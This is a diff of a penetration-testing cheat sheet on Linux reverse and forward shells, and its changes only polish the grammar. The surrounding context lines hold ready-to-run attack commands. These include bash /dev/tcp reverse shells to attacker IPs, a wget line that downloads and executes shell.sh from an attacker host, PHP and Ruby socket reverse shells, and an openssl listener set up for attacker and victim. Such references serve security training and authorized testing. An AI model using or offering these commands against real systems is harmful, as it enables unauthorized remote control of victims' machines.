@@ -32,11 +32,11 @@ sh -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
 exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
 #Short and bypass (cretdits to Dikline)
 (sh)0>/dev/tcp/10.10.10.10/9091
-#after getting the previous shell, to get the output execute
+#after getting the previous shell to get the output to execute
 exec >&0
 ```
 
-Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
+Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.
 
 ### Symbol safe shell
 
@@ -58,7 +58,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 ## Forward Shell
 
-You might find cases where you have a **RCE in a web app in a, Linux machine** but due to Iptables rules or other kind of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
+You might find cases where you have an **RCE in a web app in a Linux machine** but due to Iptables rules or other kinds of filtering **you cannot get a reverse shell**. This "shell" allows you to maintain a PTY shell through that RCE using pipes inside the victim system.\
 You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 You just need to modify:
@@ -131,7 +131,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 ## PHP
 
 ```php
-// Using 'exec' is the most common method, but makes the assumption that the file descriptor will be 3.
+// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
@@ -219,7 +219,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 
 ## OpenSSH
 
-Attacker (Kali)
+The Attacker (Kali)
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
@@ -227,7 +227,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you wil
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
 
-Victim
+The Victim
 
 ```bash
 #Linux
